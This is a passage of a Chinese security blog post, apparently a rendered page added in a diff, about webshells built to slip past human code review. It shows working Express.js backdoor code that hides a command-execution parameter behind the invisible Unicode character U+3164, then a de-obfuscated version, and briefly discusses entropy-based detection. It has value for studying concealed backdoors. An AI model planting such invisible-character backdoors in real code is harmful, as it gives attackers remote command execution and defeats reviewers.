page&quot;&#x27;</span>,ㅤ<br>    ];<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(checkCommands.<span class="hljs-title function_">map</span>(<br>            <span class="hljs-function"><span class="hljs-params">cmd</span> =&gt;</span> cmd &amp;&amp; <span class="hljs-title function_">exec</span>(cmd, &#123; <span class="hljs-attr">timeout</span>: +timeout || <span class="hljs-number">5_000</span> &#125;)<br>        ));<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>);<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;ok&#x27;</span>);<br>    &#125; <span class="hljs-keyword">catch</span>(e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>);<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;failed&#x27;</span>);<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8080</span>);<br></code></pre></td></tr></table></figure>
+<p>这个后门的使用方式如下：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/webshell-bypass-human/20220608143234.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>原理呢，其实是在 <code>&#123; timeout,ㅤ &#125;</code> 中包含了一个不可见字符 <code>\u3164</code>，所以可以从 GET 参数里获取指定的值。同样，<code>checkCommands</code> 中也包含了这个不可见字符，从而在 <code>exec</code> 中触发命令执行。如果将这个不可见字符用 <code>c</code> 来代替，这个后门就长这样：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><span class="hljs-keyword">const</span> exec = util.<span class="hljs-title function_">promisify</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">exec</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/test&#x27;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> &#123; timeout, c &#125; = req.<span class="hljs-property">query</span>;<br>    <span class="hljs-keyword">const</span> checkCommands = [<br>        <span class="hljs-string">&#x27;echo &quot;hello&quot;&#x27;</span>,<br>        <span class="hljs-string">&#x27;echo &quot;this is a test page&quot;&#x27;</span>, c<br>    ];<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(checkCommands.<span class="hljs-title function_">map</span>(<br>            <span class="hljs-function"><span class="hljs-params">cmd</span> =&gt;</span> cmd &amp;&amp; <span class="hljs-title function_">exec</span>(cmd, &#123; <span class="hljs-attr">timeout</span>: +timeout || <span class="hljs-number">5_000</span> &#125;)<br>        ));<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>);<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;ok&#x27;</span>);<br>    &#125; <span class="hljs-keyword">catch</span>(e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>);<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;failed&#x27;</span>);<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8080</span>);<br></code></pre></td></tr></table></figure>
+<p>这样是不是就很清楚啦？</p>
+<h2 id="最后一些话">最后一些话</h2>
+<p>上述的这些 webshell 能过人，会不会被机器检测到呢？我认为是有可能的。不管是第一个 webshell 的空格和 tab，还是 pro 版的那些不可见字符，它们本身就会增加文件的特殊性，虽然人眼看不出来，但是基于信息熵或者统计学方法的检测往往能揭开这类 webshell 的面纱。</p>
+<p>而我们要时刻记住的是，<code>No Silver Bullet</code> :)</p>
+<p>（涉及到的代码整理在此 <a target="_blank" rel="noopener" href="https://github.com/Macr0phag3/webshell-bypassed-human">repo</a>）</p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">来呀快活呀</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Webshell 过狗没意思，我们要过人！</div>
+      <div>https://www.tr0y.wang/2020/07/14/webshell-bypass-human/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2020年7月14日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年2月21日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/07/31/virus-beat-virus/" title="睡前小故（ying）事（ji）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">睡前小故（ying）事（ji）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/06/28/ja3/" title="JA3(S)，简单而有效的 TLS 指纹">
+                        <span class="hidden-mobile">JA3(S)，简单而有效的 TLS 指纹</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
